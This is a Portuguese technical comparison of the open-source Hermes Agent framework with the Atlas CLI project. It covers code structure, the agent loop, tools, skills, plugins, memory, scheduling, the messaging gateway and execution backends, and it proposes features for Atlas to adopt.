# Concorrente — Hermes Agent (Nous Research)

**Análise técnica para o Atlas CLI**
**Data:** 2026-04-30
**Sujeito:** [github.com/NousResearch/hermes-agent](https://github.com/NousResearch/hermes-agent), commit em `main` em 2026-04-30
**Audiência:** Vitor (operador), Codex (executor de blocos B9+ inspirados aqui)

> Documento focado em: o que o Hermes faz, como o faz no código, e o que o Atlas deve roubar (ou explicitamente não roubar). Espelha o nível de honestidade do ADR — sem marketing, sem suposição. Cada afirmação tem fonte verificada (raw GitHub ou documentação oficial).

---

## 1. Identidade

**Tese:** "agente que cresce com você". Posiciona-se como **runtime persistente de longa duração com memória, automações, mensageria e (claim) loop de aprendizado**. Open-source, MIT, mantido por Nous Research.

**Métricas reais (2026-04-30):**

| Métrica | Valor |
|---|---|
| Stars | **126.281** |
| Forks | 18.885 |
| Issues abertas | 7.318 |
| Linguagem principal | Python |
| License | MIT |
| Último push | 2026-04-30 (hoje) |
| Versão atual | v0.11.0 (release 2026-04-23, "The Interface release") |
| Volume v0.10→v0.11 | 1.556 commits, 761 PRs, 1.314 arquivos, 224.174 linhas inseridas, 29 contribuidores externos |
| Testes | ~15k tests em ~700 arquivos (abr/2026) |

**Observação operacional:** este é o repo público de IA mais ativo do nicho hoje. O Atlas não compete em volume — compete em **clareza arquitetural** e **fidelidade ao operador** (Vitor). Ler o Hermes serve para tirar ideias, não para imitar o estilo.

---

## 2. Estrutura de código (repo flat, monolítico)

Estrutura **não modular**. É monorepo Python com arquivos enormes na raiz e diretórios funcionais. Conforme [AGENTS.md](https://github.com/NousResearch/hermes-agent/blob/main/AGENTS.md) (manifesto oficial do projeto):

```
hermes-agent/
├── run_agent.py          # AIAgent — loop core (~12k LOC)
├── cli.py                # HermesCLI — orquestrador interativo (~11k LOC)
├── model_tools.py        # Tool orchestration, handle_function_call()
├── toolsets.py           # Definições de toolset, _HERMES_CORE_TOOLS
├── hermes_state.py       # SessionDB — SQLite + FTS5
├── hermes_constants.py   # get_hermes_home(), profile-aware paths
├── hermes_logging.py     # agent.log / errors.log / gateway.log
├── batch_runner.py       # Parallel batch processing
├── trajectory_compressor.py # 65 KB — compressão para training
├── mcp_serve.py          # Servidor MCP
├── agent/                # 40+ arquivos: prompts, providers, memory, curator, compressor, insights
├── hermes_cli/           # 50+ arquivos: subcomandos, wizard, plugin loader, skin engine
├── tools/                # 61 tools em 52 toolsets (auto-registro via tools/registry.py)
│   └── environments/     # 7 backends: local, docker, ssh, modal, daytona, singularity, vercel
├── gateway/              # Messaging gateway — run.py + session.py + 17 platforms/
├── plugins/              # memory/ + context_engine/ + 10 outros (dashboard, image_gen, observability, …)
├── optional-skills/      # Skills pesadas/nicho NÃO ativas por default
├── skills/               # 25 categorias de skills bundled
├── ui-tui/               # NEW v0.11: Ink (React/Node) terminal UI
├── tui_gateway/          # Python JSON-RPC backend para TUI
├── acp_adapter/          # ACP server (VS Code / Zed / JetBrains)
├── cron/                 # Scheduler — jobs.py + scheduler.py
├── environments/         # RL training environments (Atropos)
├── website/              # Docusaurus docs
└── tests/                # ~15k tests, ~700 files
```

**Tamanhos representativos (raiz/diretório → arquivo único):**

| Path | Tamanho | Comentário |
|---|---|---|
| `gateway/run.py` | 605 KB | gateway long-running, monolítico |
| `cli.py` | 527 KB | CLI principal, monolítico |
| `hermes_cli/main.py` | 388 KB | entry-point CLI |
| `hermes_cli/auth.py` | 183 KB | OAuth + 18 providers |
| `tui_gateway/server.py` | 205 KB | backend JSON-RPC do TUI |
| `gateway/platforms/feishu.py` | 192 KB | adapter Feishu (China) |
| `agent/auxiliary_client.py` | 165 KB | provider auxiliar |
| `gateway/platforms/discord.py` | 186 KB | adapter Discord |
| `tools/mcp_tool.py` | 127 KB | bridge MCP |
| `tools/browser_tool.py` | 120 KB | browser automation |
| `gateway/platforms/slack.py` | 114 KB | adapter Slack |
| `tools/delegate_tool.py` | 107 KB | subagent delegation |

**Diagnóstico:** Hermes é **vasto em superfície, monolítico em organização**. Esse padrão (`run_agent.py` 12k LOC, `gateway/run.py` 605 KB) é antipattern arquitetural sustentado pela escala da equipe + cobertura de testes (~15k testes). Atlas com Laravel modular tem services ≤30 KB e classes específicas — é **mais limpo, e para um operador único é a escolha certa**. Não copiar o estilo monolítico.

---

## 3. AIAgent — o loop síncrono

A classe central, em [run_agent.py](https://github.com/NousResearch/hermes-agent/blob/main/run_agent.py), tem signature com **~60 parâmetros**. Subset:

```python
class AIAgent:
    def __init__(self,
        base_url: str = None, api_key: str = None,
        provider: str = None,
        api_mode: str = None,         # "chat_completions" | "codex_responses" | "anthropic_messages" | "bedrock"
        model: str = "",
        max_iterations: int = 90,     # tool-calling iterations (compartilhado com subagentes)
        enabled_toolsets: list = None, disabled_toolsets: list = None,
        platform: str = None,         # "cli", "telegram", etc
        session_id: str = None,
        skip_context_files: bool = False, skip_memory: bool = False,
        credential_pool=None,
        # + callbacks, thread/user/chat IDs, iteration_budget, fallback_model,
        # checkpoints config, prefill_messages, service_tier, reasoning_config, ...
    )

    def chat(self, message: str) -> str: ...
    def run_conversation(self, user_message: str, system_message: str = None,
                         conversation_history: list = None, task_id: str = None) -> dict: ...
```

**Loop principal (síncrono, dentro de `run_conversation()`):**

```python
while (api_call_count < self.max_iterations and self.iteration_budget.remaining > 0) \
        or self._budget_grace_call:
    if self._interrupt_requested: break
    response = client.chat.completions.create(model=model, messages=messages, tools=tool_schemas)
    if response.tool_calls:
        for tool_call in response.tool_calls:
            result = handle_function_call(tool_call.name, tool_call.args, task_id)
            messages.append(tool_result_message(result))
        api_call_count += 1
    else:
        return response.content
```

**Detalhes operacionais:**
- Mensagens em formato OpenAI: `{"role": "system|user|assistant|tool", ...}`.
- Reasoning content guardado em `assistant_msg["reasoning"]`.
- `iteration_budget` é hard cap; existe um `_budget_grace_call` que permite uma chamada extra após exaurir budget (para respostas de cleanup).
- `interrupt_requested` é checado a cada iteração — operador pode parar com Ctrl+C ou `/stop`.

**Comparação Atlas ↔ Hermes:** O loop do Atlas vive distribuído entre `AiGatewayService::enqueueInteraction()` + `AiWorker` + `AiToolRuntime`. Hermes concentra tudo em `AIAgent.run_conversation()`. Vantagem Atlas: testabilidade unitária + transações DB ACID. Vantagem Hermes: 1 método, 1 ponto de entrada, fácil de raciocinar como dev novo.

---

## 4. Transport ABC (NEW v0.11) — desacoplamento de provider

**Mudança arquitetural recente.** Antes da v0.11, format conversion + HTTP transport viviam embutidos em `run_agent.py`. Em v0.11 foram extraídos para `agent/transports/` com 4 implementações:

| Transport | API target |
|---|---|
| `AnthropicTransport` | Anthropic Messages API |
| `ChatCompletionsTransport` | default OpenAI-compatible (maioria dos providers) |
| `ResponsesApiTransport` | OpenAI Responses API + Codex |
| `BedrockTransport` | AWS Bedrock Converse API |

Cada transport possui **conversão de formato + shape de API próprios**, escondendo as diferenças do `AIAgent`. Isso é o que permite Hermes suportar **18+ providers** com diferenças semânticas profundas (reasoning, thinking blocks, sandbox).

**Lição direta para o Atlas:** Hoje `ClaudeCliProvider` e `CodexCliProvider` rodam binários CLI. Quando você quiser falar com APIs (Nous Portal, OpenRouter, Anthropic API direta), o caminho correto é **introduzir uma `LlmTransport` interface** análoga ao Transport ABC do Hermes, com 3 implementações iniciais: `ClaudeCliTransport`, `CodexCliTransport`, `OpenAiCompatibleHttpTransport`. Atlas não precisa de 4; precisa do padrão. Esta decisão se encaixa naturalmente como **novo bloco entre B6 e B7** ou expansão do B6.

---

## 5. Tool Registry e tool calling

**Padrão chave:** auto-registro no import-time. Cada arquivo em `tools/` chama `tools/registry.py:register()` ao ser importado. Resultado: **61 tools em 52 toolsets**, sem lista manual.

**Cadeia de dependência declarada em [AGENTS.md](https://github.com/NousResearch/hermes-agent/blob/main/AGENTS.md):**

```
tools/registry.py  (no deps — imported by all tool files)
       ↑
tools/*.py  (each calls registry.register() at import time)
       ↑
model_tools.py  (imports tools/registry + triggers tool discovery)
       ↑
run_agent.py, cli.py, batch_runner.py, environments/
```

**Tools notáveis (com tamanho):**

| Tool file | KB | Função |
|---|---|---|
| `delegate_tool.py` | 107 | spawn de subagentes com filesystem coordination |
| `mcp_tool.py` | 127 | bridge MCP (cliente) |
| `browser_tool.py` | 120 | browser automation (via CDP) |
| `code_execution_tool.py` | 63 | execução de código nos 7 backends |
| `file_tools.py` | 52 | leitura/escrita |
| `file_operations.py` | 50 | operações compostas |
| `approval.py` | 52 | detecção de comandos perigosos + diálogo |
| `image_generation_tool.py` | 38 | geração de imagem (registry plugável) |
| `homeassistant_tool.py` | 18 | Home Assistant control |
| `discord_tool.py` | 34 | Discord notifications/posts |
| `cronjob_tools.py` | 26 | criação/listagem de cron jobs |
| `memory_tool.py` | 22 | escrita em MEMORY.md (agente chama!) |
| `mixture_of_agents_tool.py` | 22 | MoA pattern |
| `clarify_tool.py` | 5 | pede esclarecimento ao operador |
| `checkpoint_manager.py` | 31 | checkpoints |

**Comparação:** Atlas tem **12 runtime tools** (`AtlasRuntimeCommand` + `AiToolRuntime`). Hermes tem 61. Diferença não é tamanho — é **escopo**: Hermes inclui tools de domínio (Discord post, Home Assistant control, image gen, Spotify, MoA) que no Atlas seriam **skills**, não tools. Isso é uma diferença semântica relevante: Hermes mistura "tool" (capacidade primitiva) com "skill" (capacidade composta), Atlas separa.

---

## 6. Skill System — bundle + slash command

**Formato.** Skill é um **bundle de diretório** com:
- `SKILL.md` (~6 KB típico — instruções operacionais que viram contexto)
- `references/` (sub-dir com material de apoio)
- `templates/` (sub-dir com templates reutilizáveis)

**25 categorias bundled em [skills/](https://github.com/NousResearch/hermes-agent/tree/main/skills):** apple, autonomous-ai-agents, creative, data-science, devops, diagramming, dogfood, domain, email, gaming, gifs, github, index-cache, inference-sh, mcp, media, mlops, note-taking, productivity, red-teaming, research, smart-home, social-media, software-development, yuanbao.

**Plus `optional-skills/`** — skills pesadas/nicho, **não ativadas por default** (deve haver opt-in explícito do operador).

**Invocação.** Slash command com nome da skill: `/<skill-name>`. Detalhe técnico crítico de [AGENTS.md](https://github.com/NousResearch/hermes-agent/blob/main/AGENTS.md):

> Skill slash commands: `agent/skill_commands.py` scans `~/.hermes/skills/`, injects as **user message** (not system prompt) to preserve prompt caching.

Ou seja: skills entram como **mensagem user**, não system, **propositadamente para não invalidar Anthropic prompt cache**. Sutil e importante.

**Comparação direta:**

| Aspecto | Hermes | Atlas |
|---|---|---|
| Formato | Bundle (`SKILL.md` + `references/` + `templates/`) | Hoje: registry + heurística por keyword (`AiIntentRouter`); spec V2 propõe versionamento draft→default |
| Invocação | `/<skill-name>` slash | `/<agent>` ou keyword automática |
| Caching | Injeção como user message para preservar prompt cache | Já injeta como skill no `AiPromptBuilder`, mas não há otimização explícita de caching |
| Auto-melhoria | Nenhuma no core; existe via [hermes-agent-self-evolution](https://github.com/NousResearch/hermes-agent-self-evolution) (DSPy+GEPA) que evolui SKILL.md em PRs separados | Hoje nenhum loop; B5 do plano Atlas propõe `MemoryDelta` com `claim+evidence+confidence+valid_until`, que é um padrão diferente (pós-sessão, ratificado pelo operador) |
| Compat com padrão aberto | [agentskills.io](https://agentskills.io) | Não declarada |

**Roubar para Atlas:** o **formato bundle** (`SKILL.md` + `references/` + `templates/`) é mais ergonômico que registry plano e abre compat com agentskills.io. Vale considerar para B5 ou um B5.bis.

**Não roubar:** a heurística de "user message para não quebrar cache" só importa se Atlas migrar para Anthropic API direta (hoje fala com Claude/Codex CLI binários, sem cache management). Quando entrar Transport ABC (§4), aí sim copiar.

---

## 7. Plugin System — 5 superfícies extensíveis

A v0.11 expandiu drasticamente o que plugins podem fazer. Por [release notes](https://github.com/NousResearch/hermes-agent/blob/main/RELEASE_v0.11.0.md):

> Plugins can now register slash commands (`register_command`), dispatch tools directly (`dispatch_tool`), block tool execution from hooks (`pre_tool_call` can veto), rewrite tool results (`transform_tool_result`), transform terminal output (`transform_terminal_output`), ship image_gen backends, and add custom dashboard tabs.

**5 superfícies de extensão por plugin:**

1. `register_command` — adicionar slash command
2. `dispatch_tool` — chamar tool diretamente
3. `pre_tool_call` (hook que **pode vetar**) — bloqueia execução
4. `transform_tool_result` — reescreve output antes de injetar de volta
5. `transform_terminal_output` — modifica saída antes do operador ver

**3 sources de descoberta de plugin:**
- `~/.hermes/plugins/` (user)
- `.hermes/plugins/` (project)
- pip entry points

**Plugins shipados em [plugins/](https://github.com/NousResearch/hermes-agent/tree/main/plugins):** `memory/` (8 provedores), `context_engine/`, `disk-cleanup`, `example-dashboard`, `google_meet`, `hermes-achievements`, `image_gen`, `observability`, `platforms/`, `spotify`, `strike-freedom-cockpit`.

**2 tipos especiais (single-select):**
- **memory** — apenas 1 provedor de memória ativo por vez
- **context_engine** — apenas 1 engine de contexto ativa

**Comparação:** Atlas hoje **não tem plugin system**. Tem `AiPromptBuilder` que consome skills do registry, e `AtlasCliDevWorkflowService` etc. injetados via container Laravel. Adicionar plugin system não está nos blocos B0–B8. **Sugestão:** se o operador quiser estender Atlas com integrações de domínio (Spotify, Home Assistant, etc.), adicionar como skill (B5.bis bundle format) é mais barato que abrir plugin system completo. Plugin system pesado faz sentido só se quiser ecossistema externo.

---

## 8. Memory — 8 provedores plugáveis

**[plugins/memory/](https://github.com/NousResearch/hermes-agent/tree/main/plugins/memory):**

| Provedor | O que é |
|---|---|
| `byterover` | (provider externo) |
| `hindsight` | retain metadata por sessão |
| `holographic` | (provider externo) |
| `honcho` | dialectic user modeling, [github.com/plastic-labs/honcho](https://github.com/plastic-labs/honcho) — overhaul completo na v0.11 (context injection, 5-tool surface, cost safety, session isolation) |
| `mem0` | [mem0.ai](https://mem0.ai) — provedor popular |
| `openviking` | (provider externo) |
| `retaindb` | (provider externo) |
| `supermemory` | [supermemory.ai](https://supermemory.ai) |

Apenas **1 ativo por vez**. Configuração via `hermes plugins` ou `config.yaml`.

**Camada nativa do Hermes (sem provider externo):**
- `MEMORY.md` — fatos aprendidos (texto livre)
- `USER.md` — preferências
- `SOUL.md` — personalidade (system prompt slot)
- `AGENTS.md`, `.hermes.md` — contexto de projeto
- `agent/curator.py` (37 KB) — cura memória
- `agent/insights.py` (39 KB) — sumarização de sessões
- `tools/memory_tool.py` (22 KB) — **o agente chama essa tool** para escrever em `MEMORY.md`. Atualizações de memória são **explícitas via tool call**, não automáticas.

**Comparação Atlas:**

| Aspecto | Hermes | Atlas |
|---|---|---|
| Memória estruturada | DB sessions (FTS5) + arquivos texto livre | DB normalizado: `ai_session_states.decisions/open_loops/next_steps/operator_notes`, `ai_compactions.structured_state` |
| Memória "qualificada" | Não — é texto livre + delegação a provider plugável | B5 propõe `MemoryDelta` tipado: `type/claim/evidence/scope/confidence/valid_from/valid_until/use_when/do_not_use_when/requires_confirmation` |
| Updates | Agente chama `memory_tool` quando decide | B5: agente propõe; **operador ratifica** |
| Search across sessions | SQLite FTS5 | B5 não detalha; provavelmente DB query |

**Lição:** o Atlas está **certo** em ir com `MemoryDelta` tipado em vez de texto livre. Hermes paga preço de ambiguidade — sem schema, validação ou rastreio de evidência. O lance bom do Hermes é ter ecossistema plugável (8 providers) e isso vale **só se** Atlas quiser oferecer compatibilidade com mem0/honcho no futuro. Pra V2.0, manter próprio é correto.

---

## 9. Cron Scheduler — jobs first-class (lição grande para Atlas)

**Esta é a maior aprendizagem prática.** Hermes tem cron embutido. Atlas não. Vou detalhar para você poder copiar.

**Storage** (`cron/jobs.py`):
- Jobs: `~/.hermes/cron/jobs.json`
- Output: `~/.hermes/cron/output/{job_id}/{timestamp}.md`
- Permissões: `0700` (dirs), `0600` (files) — security-aware
- Lock in-process (`_jobs_file_lock`) para concorrência durante `tick()` paralelo
- `ONESHOT_GRACE_SECONDS = 120`

**Schedule formats parseados** (`parse_schedule()`):

| Formato | Tipo | Exemplo |
|---|---|---|
| `30m`, `2h`, `1d` | one-shot relativo | "once in 30 minutes" |
| `every 30m`, `every 2h`, `every 1d` | recurring interval | "every 30 minutes" |
| `0 9 * * *` (5+ campos) | cron expression | "all days at 9am" — usa `croniter` |
| `2026-02-03T14:00` | one-shot absoluto | "once at 2026-02-03 14:00" |

**Job dict (canônico):**

```python
{
  "id": "uuid",
  "title": "...",
  "prompt": "...",                      # natural language a enviar ao agent
  "schedule": "0 9 * * *",              # original
  "kind": "once|interval|cron",
  "skill": "research-quick",            # legacy single-skill
  "skills": ["research-quick", "..."],  # multi-skill (canônico v0.11)
  "platform": "telegram|cli|...",       # destino de delivery
  "next_run_at": "ISO",
  "last_run_at": "ISO",
  "last_status": "success|failure",
  "output_dir": "~/.hermes/cron/output/{id}/"
}
```

**Tick flow** (`scheduler.py`, 59 KB):
1. Tick a cada N segundos.
2. Carrega `jobs.json` com lock.
3. Filtra jobs com `next_run_at <= now`.
4. Para cada vencido: cria `AIAgent` fresco, injeta skill anexada como contexto, executa `prompt`.
5. Output salvo em arquivo Markdown timestamped.
6. Para `interval`/`cron`: `advance_next_run()`.
7. Delivery: se `platform != "cli"`, envia output via gateway adapter para Telegram/Discord/etc.

**Por que isso importa para o Atlas.** Vitor já tem o hábito de pedir "nightly backup", "daily report", "weekly review", "remove flag X em 2 semanas". Hoje isso passa por `mcp__scheduled-tasks` no harness do Claude Code, mas **não está no Atlas backend**. Adicionar é direto:

**Bloco proposto B9 — Cron / Scheduled Tasks (resumo de implementação):**

- Migration: `ai_scheduled_tasks` (id, title, prompt, schedule, kind, skill_ids[], target_platform, workspace, next_run_at, last_run_at, last_status, last_output_path, created_at, updated_at).
- Service: `App\Services\Ai\Cli\AtlasCliSchedulerService` com `parseSchedule()`, `tick()`, `runDue()`, `advanceNextRun()`.
- Worker: comando `atlas:cli:scheduler:tick` rodado via Laravel Scheduler (cada 1 min) ou supervisor. Já existe Laravel Scheduler nativo — usar.
- Comando: `atlas:cli:schedule {action=list} {--id=} {--prompt=} {--schedule=} {--skill=} {--platform=cli} {--at=} ...` com ações `list`, `add`, `remove`, `pause`, `resume`, `run-now`.
- Mapping: `bin/atlas`: `schedule) exec php artisan atlas:cli:schedule "$@";;`.
- Output: `storage/app/atlas/scheduled/{id}/{timestamp}.md`.
- Tradeoff: depender do Laravel Scheduler exige `crontab -e` adicionar `* * * * * cd /path && php artisan schedule:run` na máquina. Bootstrap pode automatizar.

Esforço estimado: **3–4 dias**. Encaixa entre B5 e B7 ou em paralelo com B8.

---

## 10. Messaging Gateway — 17 plataformas em 1 processo

**[gateway/run.py](https://github.com/NousResearch/hermes-agent/blob/main/gateway/run.py) (605 KB)** + **[gateway/platforms/](https://github.com/NousResearch/hermes-agent/tree/main/gateway/platforms)** — long-running process com adapters para:

| Plataforma | Arquivo (KB) | Notas |
|---|---|---|
| Telegram | `telegram.py` (152) + `telegram_network.py` (9) | bot oficial, streaming |
| Discord | `discord.py` (186) | servers + DMs |
| Slack | `slack.py` (114) | `/hermes` subcommand routing |
| WhatsApp | `whatsapp.py` (45) | via WhatsApp Business |
| Signal | `signal.py` (58) + `signal_rate_limit.py` (15) | |
| Email | `email.py` (27) | IMAP/SMTP |
| SMS | `sms.py` (14) | Twilio etc |
| Matrix | `matrix.py` (105) | federado |
| Mattermost | `mattermost.py` (32) | self-hosted |
| Home Assistant | `homeassistant.py` (16) | |
| BlueBubbles | `bluebubbles.py` (34) | iMessage bridge |
| Webhook | `webhook.py` (31) | HTTP push |
| API server | `api_server.py` (125) | REST endpoint |
| QQBot | `qqbot/` | China — adicionado v0.11 (17ª plataforma) |
| WeCom | `wecom.py` (65) + callback + crypto | Tencent Enterprise |
| Weixin | `weixin.py` (80) | WeChat |
| Feishu | `feishu.py` (192) + comment + rules | Lark |
| DingTalk | `dingtalk.py` (56) | Alibaba |
| Yuanbao | `yuanbao.py` (186) + media | Tencent AI |

**Padrão arquitetural:** plataforma é evento → adapter valida autorização (allowlist + DM pairing) → recupera histórico de sessão por plataforma → cria `AIAgent` fresco → entrega resposta via mesma plataforma. **Cada plataforma tem isolamento próprio de sessão**.

**Webhook direct-delivery (NEW v0.11):** webhook subscriptions podem entregar payload direto a uma plataforma chat **sem passar pelo agent** — push notification zero-LLM para alerting/uptime/event streams.

**Comparação Atlas:** Atlas hoje só tem CLI + App Expo (em construção). **Não tem messaging gateway**. Você já tem Telegram skill exposta no harness do Claude Code (vi nos system reminders), mas **isolada** — Vitor pode receber/responder via Telegram ao Claude Code, não ao Atlas-server.

**Bloco proposto B10 — Messaging Gateway Atlas (Telegram-first):**
- Service: `AtlasGatewayService` (Laravel queue worker process).
- Adapter: `TelegramAdapter` (1 plataforma — não 17, sem necessidade).
- Modelo: `ai_gateway_sessions` (platform, chat_id, user_id, last_thread_id, allowlist_status).
- Authorization: allowlist em `config/atlas.php` + opt-in DM pairing (`atlas gateway pair <code>`).
- Comando CLI: `atlas:cli:gateway {action=start|stop|status} {--platform=telegram}`.
- Reaproveita: o cron scheduler (B9) usa este gateway para entrega — sem isso, scheduled tasks ficam só no terminal.
- Tradeoff: long-running worker exige supervisord/launchctl. Laravel queue:work com `--daemon` resolve no curto prazo.

Esforço: **5–7 dias** se for só Telegram. Multiplataforma escala linearmente por adapter.

---

## 11. Terminal Backends — 7 ambientes de execução

**[tools/environments/](https://github.com/NousResearch/hermes-agent/tree/main/tools/environments)** — onde código gerado é **executado**. Lista:

| Backend | Finalidade |
|---|---|
| `local` | shell local do operador (default) |
| `docker` | container isolado — não polui o Mac |
| `ssh` | servidor remoto (qualquer Linux) |
| `modal` | [Modal.com](https://modal.com) serverless — hibernação, custo near-zero idle |
| `daytona` | [Daytona.io](https://daytona.io) workspaces serverless |
| `singularity` | HPC clusters |
| `vercel` | Vercel Sandbox (NEW) |

**Modal e Daytona** oferecem hibernação: o ambiente do agente dorme quando idle, acorda on demand. **"Custa quase nada entre sessões"** — citação direta do README.

**Lição estratégica para Atlas.** Atlas-server hoje roda local (Mac). Quando você quiser que o Atlas continue trabalhando enquanto o Mac está fechado, **precisa de backend remoto**. SSH é o caminho mais simples (VPS de $5/mês); Modal/Daytona é o caminho premium (hibernação real). Esta é uma **frente independente** dos blocos B0-B8 — não bloqueia versão final, mas multiplica utilidade após.

**Bloco proposto B11 — Remote Backend (SSH-first):**
- Permitir que `atlas:runtime shell.run` aponte para host remoto via `--host=user@vps`.
- Sync de workspace via `rsync` antes/depois.
- Mapping: `atlas remote {action=add|connect|sync|disconnect} {--host=}`.
- V2 considerar Modal/Daytona.

Esforço: **3–5 dias**.

---

## 12. TUI — Ink (React/Node) + Python JSON-RPC

**Mudança histórica em v0.11.** Antes da v0.11, TUI era prompt_toolkit (Python). Em v0.11 reescrita completa em **React/Ink (Node)** com Python JSON-RPC backend. ~310 commits de change set.

**Arquitetura** (de [AGENTS.md](https://github.com/NousResearch/hermes-agent/blob/main/AGENTS.md)):

```
hermes --tui
  └─ Node (Ink, ui-tui/)  ──stdio JSON-RPC──  Python (tui_gateway/)
                                                 ├─ server.py (205 KB)
                                                 ├─ slash_worker.py (subprocess persistente)
                                                 └─ event_publisher.py
```

**Estrutura `ui-tui/`:**
- `src/entry.tsx` — TTY gate
- `src/app.tsx` — state machine (decomposto em `app/event-handler`, `app/slash-handler`, `app/stores`, `app/hooks`)
- Componentes: `branding.tsx`, `markdown.tsx`, `prompts.tsx`, `sessionPicker.tsx`, `messageLine.tsx`, `thinking.tsx`, `maskedPrompt.tsx`
- Hooks: `useCompletion`, `useInputHistory`, `useQueue`, `useVirtualHistory`
- Tooling: Prettier + ESLint + vitest

**Features novas (v0.11):**
- Sticky composer congela durante scroll
- OSC-52 clipboard (copiar entre SSH sessions)
- Streaming live com per-turn stopwatch + git branch no status bar
- Subagent spawn observability overlay
- Light-theme preset
- `/clear` confirm
- Slash autocomplete via `complete.slash` RPC
- Path autocomplete via `complete.path` RPC

**Implicação para o Atlas B7.** O ADR §5 do Atlas decidiu **Bubble Tea (Go)**. O Hermes escolheu **Ink (React/Node)**. Mesma classe de problema, escolhas diferentes:

| Eixo | Bubble Tea (Atlas B7) | Ink (Hermes v0.11) |
|---|---|---|
| Linguagem | Go | TypeScript/React |
| Distribuição | binário único | Node + npm install |
| Performance | nativo | runtime Node |
| DX | menos elastic | React mental model |
| Curva | Go novo no Atlas | TS/Node já usado em Atlas-app (Expo) |

**Reflexão honesta:** Atlas-app já é React Native/Expo. Stack **JS/TS é familiar para Vitor**. Ink seria **menos atrito de stack** que Go. Bubble Tea é mais lean-binary. Ambas funcionam. Vale revisitar a decisão B7 antes de implementar — não fechei essa porta.

---

## 13. ACP Adapter — IDE integration

**[acp_adapter/](https://github.com/NousResearch/hermes-agent/tree/main/acp_adapter)** — servidor [Agent Communication Protocol](https://agentcommunicationprotocol.dev) (ACP) que permite Hermes ser usado de **VS Code, Zed, JetBrains** como agent.

Componentes:
- `server.py` (41 KB) — ACP server
- `session.py` (22 KB) — gerenciamento de sessão por IDE
- `events.py` (6 KB) — eventos ACP
- `permissions.py` (3 KB) — permission gating
- `tools.py` (13 KB) — tools wrapper

**Lição estratégica:** Atlas é destinado ao terminal do Vitor. Mas **IDE integration via ACP** abre Atlas como agent dentro de VS Code/Zed. Isso é **frente futura, não V2.0**. Se priorizar, vira B12 ou superior.

---

## 14. Hooks — 3 níveis (gateway, lifecycle, shell)

**Hermes tem 3 superfícies de hook:**

1. **Gateway hooks** (`gateway/hooks.py`, `gateway/builtin_hooks/`) — eventos da plataforma de mensageria.
2. **Plugin hooks** (parte do plugin system §7) — `pre_tool_call`, `post_tool_call`, `transform_tool_result`, `transform_terminal_output`.
3. **Shell hooks (NEW v0.11)** — qualquer **bash script** registrado como `pre_tool_call`, `post_tool_call`, `on_session_start`, etc., **sem precisar escrever Python plugin**.

**Comparação Atlas:** Atlas não tem hooks ativos. `AiPermissionEngine` é o ponto natural para `pre_tool_call`. Adicionar hook system explícito é trabalho de B11+ — não está nos blocos atuais.

---

## 15. `/steer` — mid-run agent nudge (NEW v0.11)

**Citação direta do release:**

> `/steer <prompt>` injects a note that the running agent sees after its next tool call, without interrupting the turn or breaking prompt cache. For when you want to course-correct an agent in-flight.

Padrão **brilhante** de UX. Operador vê agente indo na direção errada → digita `/steer "lembre-se de não tocar em X"` → mensagem entra **após** o próximo tool call, **sem invalidar prompt cache** (é appendado, não inserido).

**Implementação no Atlas:** No REPL do `AiChatCommand` adicionar `/steer <prompt>` que:
1. Anota `pending_steer` em `AiSessionStateService.metadata`.
2. No próximo `tool_result_message`, injeta como tool message extra antes de retornar ao loop.
3. Cache se preserva porque é append-only.

Esforço: **0.5 dia**. Ganho: alto. **Sugiro adicionar ao B1 ou B2** — barato e útil.

---

## 16. Self-Evolution — DSPy + GEPA (repo separado)

**[github.com/NousResearch/hermes-agent-self-evolution](https://github.com/NousResearch/hermes-agent-self-evolution)** — não é parte do core. É **pipeline externo** que evolui prompts/skills do Hermes.

**Mecanismo (resumido da doc oficial):**

- **DSPy + GEPA (Genetic-Pareto Prompt Evolution)** lê **execution traces** para entender **por que** falhas ocorrem (não só **que** ocorreram).
- **Reflective prompt evolution** — propõe mutações dirigidas, avalia variantes, seleciona via natural selection.
- **Fase 1 (atual)** — evolui arquivos `SKILL.md` (max 15 KB).
- **Fases planejadas** — descrições de tools (max 500 chars), seções de system prompt, código de implementação.
- **Output** — variantes aprovadas viram **pull requests** no repo principal.
- **Custo** — ~$2-10 por otimização. Não usa GPU.
- **Diferença vs RLHF** — não retreina modelo. Evolui **texto** (prompts) por mutação dirigida + seleção pareto.

**Implicação para o Atlas.** Se Atlas tiver:
1. Traces ricos persistidos (B3 do plano — `ai_tool_events`).
2. Quality evaluations com flags estruturadas (já tem — `ai_quality_evaluations`).
3. Skills com schema (B5/B5.bis bundle format).

Então **rodar GEPA/DSPy contra Atlas é factível como projeto paralelo**. Não é V2.0, mas é **alavanca de longo prazo**. Vale guardar como B13+.

---

## 17. Persistência completa

**Texto** (`HERMES_HOME = ~/.hermes/`):
- `SOUL.md` — personalidade
- `MEMORY.md` — fatos aprendidos
- `USER.md` — preferências
- `AGENTS.md` (no repo) + `.hermes.md` (no projeto) — contexto

**SQLite + FTS5:**
- `state.db` — sessions, parent/child lineage via compactions, isolamento por plataforma
- Auto-prune + VACUUM no startup (NEW v0.11)

**JSON:**
- `~/.hermes/config.yaml` — settings
- `~/.hermes/.env` — API keys
- `~/.hermes/cron/jobs.json` — cron jobs
- `~/.hermes/profiles/` — perfis (multi-tenant local)
- `~/.hermes/cron/output/{id}/{ts}.md` — outputs de cron

**Logs:**
- `~/.hermes/logs/agent.log` — INFO+
- `~/.hermes/logs/errors.log` — WARNING+
- `~/.hermes/logs/gateway.log` — quando gateway rodando

**Comparação Atlas:** Atlas é **DB-first** (Postgres + 14 tabelas), Hermes é **flat-file-first** (texto + SQLite + JSON). Decisão divergente. Atlas é mais auditável e queryable; Hermes é mais portátil e fácil de hackear manualmente. Ambas defensáveis para casos diferentes.

---

## 18. Comparação direta Hermes ↔ Atlas

| Eixo | Hermes Agent | Atlas CLI |
|---|---|---|
| Stack | Python flat (12k LOC em `run_agent.py`) | Laravel/PHP (services modulares ≤30 KB) |
| Arquitetura interna | Monolítica, mas com Transport ABC desacoplando providers | Distribuída (Gateway + Worker + Runtime + Permission + Quality) |
| Loop principal | Síncrono, 90 iterações max, 60-param init | Distribuído entre `AiGatewayService::enqueueInteraction()` + `AiWorker` + `AiToolRuntime` |
| Provider count | 18+ via `(api_mode, api_key, base_url)` tuple | 2 (Claude/Codex CLI binários) |
| Provider abstraction | Transport ABC + 4 transports (NEW v0.11) | Provider classes simples; B6 propõe RouterDecision com sinais |
| Tools count | 61 em 52 toolsets, auto-registro import-time | 12 runtime tools |
| Skill format | Bundle (`SKILL.md` + `references/` + `templates/`), 25 cats | Registry + heurística por keyword; B5 propõe versionamento |
